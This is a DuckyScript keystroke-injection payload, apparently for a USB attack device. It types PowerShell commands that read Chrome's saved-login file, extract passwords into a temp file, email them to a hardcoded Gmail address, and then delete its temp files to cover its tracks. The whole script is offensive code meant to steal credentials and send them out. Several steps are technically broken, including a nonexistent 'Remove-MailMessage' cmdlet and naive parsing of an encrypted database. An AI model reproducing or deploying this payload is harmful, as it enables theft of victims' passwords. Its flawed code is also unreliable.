DELAY 1000
REM Detect OS
STRING powershell -Command "if ([System.Environment]::OSVersion.Version.Major -eq 10) { Write-Output 'Windows 10' } else { Write-Output 'Other Windows Version' }" > %TEMP%\os.txt
ENTER
DELAY 1000

REM Retrieve Chrome Passwords
STRING powershell -Command "$passwords = (Get-Content -Path $env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data -ErrorAction SilentlyContinue) | Select-String -Pattern 'password' | ForEach-Object { $_.ToString().Split(',')[5] } | ForEach-Object { $_.Substring(12) }; $passwords | Out-File -FilePath %TEMP%\passwords.txt"
ENTER
DELAY 1000

REM Send Passwords via Email
STRING powershell -Command "$smtpServer = 'smtp.gmail.com'; $smtpPort = 587; $smtpUsername = 'your-email@gmail.com'; $smtpPassword = 'your-password'; $emailTo = 'beaglezalt@gmail.com'; $emailFrom = 'your-email@gmail.com'; $emailSubject = 'Chrome Passwords'; $emailBody = Get-Content -Path %TEMP%\passwords.txt; Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $smtpUsername, (ConvertTo-SecureString -String $smtpPassword -AsPlainText -Force)) -To $emailTo -From $emailFrom -Subject $emailSubject -Body $emailBody"
ENTER
DELAY 1000

REM Delete Email after 15 Minutes
STRING powershell -Command "$emailToDelete = 'beaglezalt@gmail.com'; $emailToDelete | Remove-MailMessage -Confirm:$false"
ENTER
DELAY 1000

REM Clear All Tracks
STRING powershell -Command "Remove-Item -Path %TEMP%\os.txt, %TEMP%\passwords.txt -Force"
ENTER
DELAY 1000
